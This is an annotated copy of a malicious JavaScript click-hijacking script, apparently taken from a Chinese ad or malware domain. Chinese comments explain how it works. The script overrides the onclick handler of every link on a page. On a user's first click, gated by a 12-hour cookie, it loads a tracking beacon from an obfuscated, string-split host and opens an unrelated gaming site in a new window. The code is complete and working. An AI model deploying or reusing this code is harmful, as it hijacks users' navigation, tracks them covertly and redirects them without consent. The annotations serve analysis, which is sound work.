//http://s1.gzmjnx.cn/res/cres/p_a_clk.js
// 此脚本主要用来劫持页面中所有的超链接,并且只劫持第一次点击哦.禁用cookie的话,就惨了
// 这就是为什么明明点击的是一个正常的链接,居然打开的是一个游戏网站,并且再一次想重现都很难
(function(d) {
    function $a(p) {
        var x = d.getElementsByTagName("head")[0];
        x.appendChild($s(p))
    }
    function $c(n) {
        return d.createElement(n)
    }
    function $s(p) {
        var j = $c("script");
        j.src = p;
        j.async = true;
        j.type = "text/javascript";
        return j
    }
    function $isInArr(arr, em) {
        for (var i = 0; i < arr.length; i++) {
            if (arr[i] == em) {
                return true
            }
        }
        return false
    }
    // 操作cookie的好函数, 学习了
    var sCkie = new function() {
        this.expTime = function(millisecond) {
            if (millisecond.length == 0) {
                millisecond = 0
            }
            var exp = new Date();
            exp.setTime(exp.getTime() + parseInt(millisecond));
            return exp.toGMTString()
        };
        this.add = function(name, value, expires, path, domain, secure) {
            d.cookie = name + "=" + encodeURI(value) + (expires ? (";expires=" + expires) : "") + (path ? (";path=" + path) : "") + (domain ? (";domain=" + domain) : "") + ((secure) ? ";secure" : "")
        };
        this.get = function(name) {
            var arg = name + "=";
            var alen = arg.length;
            var theCookie = "" + d.cookie;
            var inCookieSite = theCookie.indexOf(arg);
            if (inCookieSite == -1 || name == "") {
                return ""
            }
            var begin = inCookieSite + alen;
            var end = theCookie.indexOf(";", begin);
            if (end == -1) {
                end = theCookie.length
            }
            return decodeURI(theCookie.substring(begin, end))
        }
    };
    var u = {
        j: "ht",
        c: "com",
        q: "tp:",
        m: "orjx.",
        n: "vict",
        d: "img."
    };
    var m_url = "http://s1.gzmjnx.cn/cl/html/fav.html";
    var ls = ["gjrowx.code.mytanwan.com", "cdn.859377.com", "zhilian.1x3x.com", "youxi.baidu.com", "bdty.yy.com", "www.51miyou.cn", "scgg.gyyx.cn"];
    try {
        var urlOjb = {};
        //这里开始劫持页面中的所有的a标签,除了指定链接的标签
        var e = d.getElementsByTagName("A");
        for (var j = 0; j < e.length; j++) {
            if (e[j].innerHTML && e[j].href && e[j].href.length > 10 && e[j].href.indexOf("javascript:") < 0) {
                e[j].onclick = function() {
                    // 测试 提前返回即可 但是注意不可返回false,否则原有链接失效
                    //return true;

                    // 如果是已知的链接,即不再跳转
                    if ($isInArr(ls, location.hostname)) {
                        return true
                    }
                    var ckie = 0;
                    var sid = "lpvt_438c9e92fb6e38d13e2e76eaa502bdd3";
                    var skie = sCkie.get(sid);
                    if (skie != "") {
                        ckie = parseInt(skie) ; //会得到1;
                    }
                    // 如果没有cookie
                    if (ckie < 1) {
                        // 设置cookie及过期时间
                        sCkie.add(sid, "1", sCkie.expTime(12 * 60 * 60 * 1000), 0, 0, 0);
                        // 每一次跳转(点击)就插入一个secript标签发起一次请求,给服务器统计数据,同时暴露隐私
                        $a(u.j + u.q + "//" + u.d + u.n + u.m + u.c + "/cnzz/dw/bds/clk.php?u=" + "hqb_fmt" + "&a=" + Math.random());

                        // 跳转(打开其他窗口的)的最终执行者
                        window.open(m_url, "_blank");
                        return false
                    }
                    //如果之前有设置过cookie,及直接返回什么true(一定不能返回false,那样会让所有原来的链接失效)都不做,
                    //如果一个页面有很多的链接,就会添加很多的时间,不知会不会影响性能??
                    return true
                }
            }
        }
    } catch (e) {}
})(document)

